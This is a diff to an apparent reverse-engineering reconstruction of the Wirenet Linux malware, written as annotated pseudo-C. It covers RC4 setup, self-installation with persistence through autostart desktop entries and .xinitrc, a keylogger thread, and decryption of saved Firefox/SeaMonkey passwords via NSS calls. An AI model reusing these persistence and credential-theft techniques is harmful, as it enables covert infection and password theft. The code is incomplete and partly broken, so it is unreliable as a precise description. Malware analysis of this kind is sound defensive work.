@@ -48,6 +48,78 @@ void cpLogonSessions (uint32_t fd);
 
 
 
+//
+int16_t DecryptSettings (char * settings) {
+
+	// settings
+	// 			I
+}
+
+
+int32_t __attribute__((cdecl)) RC4Crypt (char * settings, char * parameter, int32_t length) {
+
+	// This is likely an RC4 implemented by asomeone as althought the compiler
+	// used 'AND' there are somehow a bilion operations more than necessary
+	// 
+	// The next step is to use this newly-created SBox to encode the data.
+	// This is done by creating a keystream using the SBox and this algorithm.
+	// The result, K is then used in an XOR operation with each byte of the plaintext to generate the encrypted data.
+	// 
+	// i := 0
+	// j := 0
+	// for x from 0 to len(plaintext)
+	//  i := (i + 1) mod 256
+	//  j := (j + S[i]) mod 256
+	//     swap values of S[i] and S[j]
+	//  K := S[(S[i] + S[j]) mod 256]
+	//  output K ^ plaintext[x]
+	// endfor
+
+	// Some cryptographic algorithms do not employ a magic constant. Notably, the Interna-
+	// tional Data Encryption Algorithm (IDEA) 
+	// and the RC4 algorithm build their struc-
+	// tures on the fly, and thus are not in the li
+	// st of algorithms that will be identified. 
+	// Malware often employs the RC4 algorithm, pr
+	// obably because it is small and easy to 
+	// implement in software, and it has no cr
+	// yptographic constants to give it away
+
+}
+
+
+
+
+// SBOX setup
+int32_t __attribute__((cdecl)) RC4Setup (int settings, int key, int length) {
+
+	char array[256];
+	int32_t j = 0;
+	char dummy;
+
+	// Initialize the array 
+	for (int32_t i = 0; i < 256; ++i) {
+		array[i] = i;
+	}
+
+	// RC4 Key generation algortithm
+	// 
+	// j := 0
+	// for i from 0 to 255
+	//     j := (j + S[i] + key[i mod keylength]) mod 256
+	//     swap values of S[i] and S[j]
+	// endfor
+
+	for (int32_t i = 0; i < 256; ++i) {
+		j = (i + S[j] + key[i % length]) % 256;
+		// Swap
+		dummy = S[i];
+		S[i] = S[j];
+		S[j] = dummy;
+	}
+	
+}
+
 
 void  __attribute__((cdecl)) InitTransfersList () {
 	for (int i = 0 ; i <  255; ++i) {
@@ -742,6 +814,7 @@ int32_t GetGoogleChromePasswords () {
 
 
 int32_t __attribute__((cdecl)) GetLoginDataPath (char * browser_name, char * result, int a3) {
+	
   char * homepath;
 
   if ( name == (char *)4 )
@@ -761,14 +834,84 @@ int32_t __attribute__((cdecl)) GetLoginDataPath (char * browser_name, char * res
 
 BOOL InstallHost () {
 
-	// Opens a semaphore so that only one malware instances runs on the system
-	OpenMutexHandle ();
+	char * file;
 
+	// Opens a semaphore so that only one malware instances runs on the system
+	if (!OpenMutexHandle () && !IsOptionEnabled(32)) 
+		exit (0);
+
+	// Obtain the file through the '/proc' interface 
+	// /proc/%i/exe to get the filename
+	if ( !(result = cpGetLocalFileName()) )
+		exit (0);
+	
+	if (name = TranslateMacros(InstallPath)) {
+		// Use the local file name as a logical reference
+		StrCopy (&file, name, ...);
+	} else {
+		// If the name is still the same we will simply copy as that
+		StrCopy (&file, InstallPath, ...);
+	}
+
+	if (IsOptionEnabled(1) && !WildcardCompare(&file, &arg)) {
+
+		// WildcardCompare : considering the name may not be the one set by the authors
+		// the malware uses a regexp to see if there's any program running that was started
+		// with the same args
+		
+		if (cpCopyFile ()) {
+
+			cpExecuteFile ( chmod (&file, ...) , &file, &arg, 0);
+			exit (0);
+		}
+
+		if (IsOptionEnabled(8)) {
+
+			home = getenv("HOME");
+
+			// Creates a directory if it doesn't exist. This 
+			// This directory is used to determine which application
+			// will be launched on startup
+			// %s: home
+			cpMkDir ("%s/.config/autostart");
+
+			// Open the file
+			fopen64 (ptr, "w");
+
+			// Write to a file
+			// %s : arg
+			// %s : StartupKeyName1
+			fwrite ("\n[Desktop Entry]\nType=Application\nExec=\"%s\"\nHidden=false\nName=%s\n");
+		}
+
+		if ( IsOptionEnabled(16) ) {
+
+			home = getenv("HOME");
+			// %s: home
+			fopen64 ("%s/.xinitrc", "a+");
+		}
+
+		if ( IsOptionEnabled(128) )
+			RunAsDaemon ();
+
+		if ( IsOptionEnabled(4) )
+			return 5;
+
+		if ( IsOptionEnabled(64) )
+			TranslateMacros (KeyLoggerFileName);
+
+	}
+	// 
+	// In this function the malware uses different means to achieve the state in
+	// which the host system has one and only one instance running of the malware.
+	// On top of that, Wirenet is able to use .xinitrc which means system running
+	// WM can be infected aswell.
+	// 
 	// 
 
 	// Start keylogger
 	cpBeginThread (cpStartKeylogger(), NULL);
-	return ;
+	return 5;
 }
 
 
@@ -1023,6 +1166,8 @@ int32_t  __attribute__((cdecl)) GetMozillaProductPasswords (int32_t arg_0) {
 	char * profile_file_name;
 	char * init;
 	void * libhandle;
+	sqlite3_stmt* stmt;
+	sqlite3 **db_handle;
 
 	// Attack seamonkey
 	if (arg_0 == 6) {
@@ -1071,8 +1216,9 @@ int32_t  __attribute__((cdecl)) GetMozillaProductPasswords (int32_t arg_0) {
 	}
 
 
-FAILURE:
-
+EXIT:
+	
+	// Releases the dynamic library
 	CleanUpMozilla ();
 	return ;
 
@@ -1094,8 +1240,13 @@ SUCCESS:
 	cpGetProcAddress (handle , "sqlite3_step");
 	cpGetProcAddress (handle , "sqlite3_columne_text");
 	
-	// Once everything is loaded, we're ready to 
-	sqlite3_prepare_v2 ("select *  from moz_logins");
+	// SQLite docs https://www.sqlite.org/c3ref/column_blob.html
+
+	// Once everything is loaded, we're ready to open the database
+	sqlite3_open("...", db_handle);
+
+	// Prepare the statement
+	sqlite3_prepare_v2 (database, "select *  from moz_logins", 25, stmt, ...);
 
 	// SECStatus 	NSS_Init (const char *configdir)
 	NSS_Init (...);
@@ -1106,10 +1257,22 @@ SUCCESS:
 	// 
 	PK11_Authenticate (keySlot);
 
-	// 
-	sqlite3_column_text ();
-	// 
+	// Get the return values of the previous query
+	sqlite3_column_text (stmt, ...);
 
 	// 
+	// 
+	NSSBase64_DecodeBuffer ();
 
+ 	// PK11SDR_Decrypt
+ 	//  Decrypt a block of data produced by PK11SDR_Encrypt. The key used is
+ 	//  identified by the keyid field within the input.
+ 	// 
+ 	// 
+	PK11SDR_Decrypt ();
+
+	// Evaluate the SQL statement to see if was executed successfully
+	sqlite3_step ();
+
+	goto EXIT;
 }
